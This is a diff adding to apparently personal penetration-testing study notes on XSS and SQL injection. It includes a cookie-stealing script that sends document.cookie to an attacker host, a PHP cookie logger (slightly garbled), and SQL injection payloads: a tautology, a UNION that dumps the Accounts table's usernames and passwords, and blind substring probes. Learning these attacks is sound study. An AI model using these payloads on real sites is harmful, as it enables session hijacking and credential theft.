@@ -172,7 +172,21 @@ Cross Site Scripting (XSS)
 			Single attack can impact multiple users. E.g. if malicious payload is loaded into a social network page every user visiting that page will run the payload.
 			Common vector are html forms E.g. comments, user profiles and forum posts. 
 			Can display current cookies with <script>alert(document.cookie)</script>
-
+			This code can send cookies to an attacker controlled site. 
+				<script>
+				var i = new Image();
+				i.src="http://attacher.site/log.php?q="+document.cookie;
+				</script>
+				the browser cannot tell in advance that it isn't an image so runs the source. 
+				<?php
+				?filename="/tmp/log.txt";
+				?fp=fopen($filename, 'a');
+				$cookie=$_GET['q'];
+				fwrite($fp, $cookie);
+				fclose($fp);
+				?>
+				TRY HACK.ME
+				https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
 		DOM Based. 
 
 	Vulnerabilty lets an atatcker control some of the content of a web application
@@ -204,6 +218,102 @@ Cross Site Scripting (XSS)
 					Test injecting HTML code. E.g. <i>, <pre> or <plaintext>
 					<script>alert('XSS')</script>		
 		
-				
+SQL Injections
+		Web applications interact with backend database using Structure Query Language (SQL)
+		SQL Injection (SQLi) attacks allow unauthorised user to take control over SQL Statements used by a web application.
+			User Credentials
+			Data of the Web application
+			Credit card numbers
+			Shopping transactions
+			
+	SQL Basics
+		SQL Statement Syntax
+			SELECT <columns list> FROM <table> WHERE <condition>;
+			Also possible to select constant values
+			SELECT 22, 'string',0x12, ;another string';
+		How to perform a query
+		How to union the results of two queries
+			<SELECT STATEMENT> UNION <Other select statement>;
+			SELECT Name, Description FROM Products WHERE ID='3' UNION SELECT Username, Password FROM Accounts;
+			SELECT Name, Description FROM Products WHERE ID='3' UNION SELECT 'Example', 'Data';
+		How comments work
+			# or --
+	Application must
+		Connect -> Submit Query -> Retrieve results 
+		-- Static Query inside a PHP page. 
+		$dbhostname='1.2.3.4';
+		$dbuser='username';
+		$dbpassword='password';
+		$dbanme='database';
+		
+		$connection = mysqli_connect($dbhostname, $dbuser, $dbpassword, $dbname);
+		$query = "Select Name, Description FROM Products WHERE ID='3' UNION Select Username, Password from Accounts;";
+		$results = mysqli_query($connection, $query);
+		display_results($results);
+		
+		-- Dynamic built based on user inputs. Dangerous as a malicious user can expliot the query construction to take control of the database 
+		$id = $_GET['id'];
+		
+		$connection = mysqli_connect($dbhostname, $dbuser, $dbpassword, $dbname);
+		$query = "Select Name, Description FROM Products WHERE ID='$id';";
+		$results = mysqli_query($connection, $query);
+		display_results($results);
+		
+		What if we craft $id to change the query. 
+			' OR 'a'='a 
+		Then the query becomes 
+			Select Name, Description FROM Products WHERE ID='' OR 'a'='a';
+		This tells the database to select the items by checking the two conditions
+			The id must be empty (id='')
+			OR an always true condition ('a'='a')
+		While the first is not met the seccond is always true and as a result it tels the database to select all the items in the Products table. 
+		
+		or supplying
+			' UNION SELECT Username, Password from Accounts WHERE 'a'='a
+		Making the query
+			Select Name, Description FROM Products WHERE ID='' UNION SELECT Username, Password from Accounts WHERE 'a'='a';
+		Selects anything with an empty id (An empty set) and then unions with all the entries in the Accounts table
+		
+	Need to find the injection point and craft a payload to take over a dynamic query.
+	
+	Need to test every supplied user input. 
+	
+	GET Parameters
+	POST Parameters
+	HTTP Headers
+		User Agent, Cookie, Accept
+		
+	Test by trying to inject:
+		String terminators: ' and "
+		SQL commands: SELECT, UNION and others
+		SQL comments: # or --
+		
+		Always test one injection at a time. 
+		Need to find all and any vulnerability so you have to test all other inputs. 
+		can use BURP Proxy to test Headers, Cookies and POST Parameters.
+	After finding how to manually exploit an injection you can efficiently automate the exploitation by means of automatic tools. 
+	
+	Boolean based
+		As above '' OR 'a'='a';
+		Want to transform a query in a True/False condition which reflects its state to the web application output. 
+		An always false query doesn't show anything so vulnerable. 
+		Find current database user by using boolean based blind sql injections. 
+		To find the first letter
+			' or substr(user(),1,1)= 'a
+			' or substr(user(),1,1)= 'b
+		Then the seccond
+			' or substr(user(),2,1)= 'a
+	
+	Union based
+		' UNION SELECT user(); -- -
+		Forces the result to show on the output page. 
+		The -- comment prevents the following part of the original query to be parsed by the databasse. 
+		The last - is becasue most browsers remove trailing spaces in the URL so, if you need ot inject a comment via a GET request, you have to add a character after the trailing space of the comment. 
+		
+		'UNION SELECT null; -- - 
+		gives an error, the number of fields don't match. 
+		'UNION SELECT null, null; -- - 
+		no Error. So two fields. 
+		' UNION SELECT 'elsid1', 'elsid2'; -- -
 		
 		
